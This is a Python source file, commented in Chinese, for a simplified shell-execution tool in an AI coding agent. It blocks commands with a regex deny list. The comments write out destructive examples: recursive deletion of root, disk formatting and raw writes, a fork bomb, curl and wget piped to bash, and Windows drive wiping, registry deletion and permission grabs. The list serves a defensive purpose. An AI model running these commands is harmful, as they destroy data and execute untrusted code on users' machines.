"""Shell 命令执行及安全检查。

Claude Code 的 BashTool 有 1143 行。这是提炼版：
- 输出捕获并截断（保留开头+结尾）
- 超时支持
- 危险命令检测
- 工作目录追踪（cd 感知）
"""

import os
import re
import subprocess
from .base import Tool

# 跨命令追踪 cwd（Claude Code 也这样做）
# cwd：Current Working Directory，即当前工作目录‌
_cwd: str | None = None

# 危险命令黑名单 — 匹配到即拦截执行
# 每个模式 = (正则, 拦截原因)
# 以下为各正则能捕获的真实命令示例：
#
# rm -rf /                    -> 递归删除 home/root
# rm -rf ~                    -> 递归删除 home/root
# rm -r --no-preserve-root /  -> 递归删除 home/root
#
# rm -rf .                    -> 强制递归删除（路径无限制版）
# rm -rf ./node_modules       -> 强制递归删除
#
# mkfs.ext4 /dev/sdb1         -> 格式化文件系统
#
# dd if=/dev/zero of=/dev/sda -> 裸磁盘写入
#
# echo xxx > /dev/sda         -> 覆写块设备
# cat foo > /dev/sdb1         -> 覆写块设备
#
# chmod -R 777 /              -> 对根目录 chmod 777
# chmod 777 /usr              -> 对根目录 chmod 777
#
# :(){ :|: & };:              -> fork 炸弹（耗尽系统进程）
#
# curl http://x.sh | bash     -> 管道 curl 到 bash
# curl http://x.sh | sudo bash -> 管道 curl 到 bash
#
# wget -O- http://x.sh | bash   -> 管道 wget 到 bash
_DANGEROUS_PATTERNS = [
    (r"\brm\s+(-\w*)?-r\w*\s+(/|~|\$HOME)", "递归删除 home/root"),
    (r"\brm\s+(-\w*)?-rf\s", "强制递归删除"),
    (r"\bmkfs\b", "格式化文件系统"),
    (r"\bdd\s+.*of=/dev/", "裸磁盘写入"),
    (r">\s*/dev/sd[a-z]", "覆写块设备"),
    (r"\bchmod\s+(-R\s+)?777\s+/", "对根目录 chmod 777"),
    (r":\(\)\s*\{.*:\|:.*\}", "fork 炸弹"),
    (r"\bcurl\b.*\|\s*(sudo\s+)?bash", "管道 curl 到 bash"),
    (r"\bwget\b.*\|\s*(sudo\s+)?bash", "管道 wget 到 bash"),

    # ─── Windows 危险命令 ─────────────────────────────────────
    # 注意：Windows CMD 和 PowerShell 命令实际在 Git Bash/WSL/bash
    # 环境下也能执行。以下规则覆盖两者中最具破坏性的操作。
    #
    # del /f /s /q C:\*             -> Windows 强制删除
    # del /f /s /q C:\Windows\*    -> Windows 强制删除
    (r"\bdel\s+.*/[fqs]+\s+[A-Z]:\\", "Windows 强制删除文件"),
    #
    # rd /s /q C:\Windows          -> Windows 强制删除目录树
    # rmdir /s /q D:\              -> Windows 强制删除目录树
    (r"\b(rd|rmdir)\s+/[sq]+\s+[A-Z]:\\", "Windows 强制删除目录"),
    #
    # format D: /q /y              -> 快速格式化磁盘
    # format C: /fs:ntfs           -> 格式化并重设文件系统
    (r"\bformat\s+[A-Z]:\s*.*/[qy]", "Windows 格式化磁盘"),
    #
    # diskpart clean               -> 清除整个磁盘分区表
    # diskpart clean all           -> 清除整个磁盘（含隐藏区）
    (r"\bdiskpart\s+clean", "Windows 清除磁盘分区表"),
    #
    # reg delete HKLM /f           -> 递归删除注册表项
    # reg delete HKCU\Software /f  -> 递归删除注册表项
    (r"\breg\s+delete\s+HK", "Windows 删除注册表"),
    #
    # cipher /w:C:                 -> 覆写磁盘空闲空间（不可逆）
    (r"\bcipher\s+/\w", "Windows 覆写磁盘空闲空间"),
    #
    # takeown /f C:\Windows /r     -> 强行取得系统文件所有权
    # icacls C:\Windows /grant Everyone:F /T  -> 开放 Everyone 完全控制
    (r"\btakeown\s+/[rf].*[A-Z]:\\", "Windows 夺取文件所有权"),
    (r"\bicacls\s+.*Everyone\s*:\s*F", "Windows 开放 Everyone 完全控制"),
    #
    # powershell Remove-Item -Recurse -Force C:\*
    # powershell Clear-RecycleBin -Force
    # powershell Format-Volume -DriveLetter C -FileSystem NTFS
    # 注意：PowerShell 命令号长且灵活，很难穷举，只拦截最危险的
    (r"\bRemove-Item\s+.*-Recurse\s+.*-Force", "PowerShell 强制递归删除"),
    (r"\bClear-RecycleBin\b", "PowerShell 清空回收站"),
    (r"\bFormat-Volume\b", "PowerShell 格式化卷"),
]


class BashTool(Tool):
    name = "bash"
    description = (
        "执行 shell 命令。返回 stdout、stderr 和退出码。"
        "用于运行测试、安装包、git 操作等。"
    )
    parameters = {
        "type": "object",
        "properties": {
            "command": {
                "type": "string",
                "description": "The shell command to run",
            },
            "timeout": {
                "type": "integer",
                "description": "Timeout in seconds (default 120)",
            },
        },
        "required": ["command"],
    }

    def execute(self, command: str, timeout: int = 300) -> str:
        global _cwd
        # 安全检查
        warning = _check_dangerous(command)
        if warning:
            return f"⚠ 已拦截：{warning}\n命令：{command}\n如果是有意为之，请修改命令使其更具体。"

        # 使用追踪的工作目录
        cwd = _cwd or os.getcwd()

        try:
            proc = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=cwd,
                encoding="utf-8", # 设置编码
                errors="ignore"  # 或 "replace"
            )

            # 追踪 cd 命令，使下一个命令在正确位置运行
            if proc.returncode == 0:
                _update_cwd(command, cwd)
            out = proc.stdout
            if proc.stderr:
                out += f"\n[stderr]\n{proc.stderr}"
            if proc.returncode != 0:
                out += f"\n[exit code: {proc.returncode}]"
            # 保留开头+结尾以保存最有用的信息
            if len(out) > 15_000:
                out = (
                    out[:6000]
                    + f"\n\n... 已截断（共 {len(out)} 字符）...\n\n"
                    + out[-3000:]
                )
            return out.strip() or "(no output)"
        except subprocess.TimeoutExpired:
            return f"Error: timed out after {timeout}s"
        except Exception as e:
            return f"Error running command: {e}"


def _check_dangerous(cmd: str) -> str | None:
    """如果命令看起来有破坏性则返回警告字符串，否则返回 None。"""
    for pattern, reason in _DANGEROUS_PATTERNS:
        if re.search(pattern, cmd):
            return reason
    return None


def _update_cwd(command: str, current_cwd: str):
    """追踪 cd 命令导致的目录变化。"""
    global _cwd
    # 简单启发式：查找在 && 链末尾或单独的 cd 命令
    parts = command.split("&&")
    for part in parts:
        part = part.strip()
        if part.startswith("cd "):
            target = part[3:].strip().strip("'\"")
            if target:
                new_dir = os.path.normpath(os.path.join(current_cwd, os.path.expanduser(target)))
                if os.path.isdir(new_dir):
                    _cwd = new_dir
